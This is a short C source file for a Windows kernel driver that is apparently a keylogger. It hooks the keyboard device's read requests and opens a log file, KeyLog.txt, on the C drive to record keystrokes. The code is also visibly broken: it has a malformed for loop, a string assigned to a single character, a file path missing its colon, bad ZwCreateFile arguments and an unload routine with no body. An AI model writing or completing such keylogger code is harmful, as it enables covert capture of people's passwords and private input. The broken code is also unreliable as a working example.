#include "common.h"
#include "KWrite.h"
#include "Klog.h"
#include "KHook.h"
extern "C" DriverEntry(PDRIVER_OBJECT pDriverObject, UNICODE_STRING RegisterPath)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	int i ;
	do{
		for (i=0; i<IRP_MJ_MAXIMUM_FUNCTION, i++)
		{
			pDriverObject->MajorFunction[i] = HookDevicePassThrough;
		}
		pDriverObject->MajorFunction[IRP_MJ_READ] = HookDeviceRead;
		pDriverObject->DriverUnload = HookDeviceUnload;
		Status = HookKeyboardDevice(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
		Status = InitWriteFileThread(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
		Status = OpenLogFile(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
	}while (false);
	if (!NT_SUCCESS(Status))
	{
		DbgPrint("Error Code:%d",Status);
	}
	return Status;
}

NTSTATUS OpenLogFile(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTIONSION pKeyboarDeviceExtension = 
		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
	WCHAR wFileName = "\\DosDevices\\c\\KeyLog.txt";
	UNICODE_STRING uFileName;
	OBJECT_ATTRIBUTES ObjAtr;
	IO_STATUS_BLOCK IoStatus;
	NTSTATUS Status ;
	
	RtlInitUnicodeString(&uFileName, wFileName);
	InitializeObjectAttributes(&ObjAtr, uFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
	//zwCreateFile(&handle,GENERIC_WRITE,ObjAtr,FILE_CREATED, &ioStatus, NULL,FILE_ATTRIBUTE_NORMAL, 
	//FILE_SHARE_READ,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL, 0);
	Status = ZwCreateFile(pKeyboarDeviceExtension->hFile, GENERIC_WRITE, ObjAtr, FILE_CREATED, &IoStatus, FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	return Status;

}


NTSTATUS HookDeviceUnload(PDRIVER_OBJECT pDriverObject)
{
	
}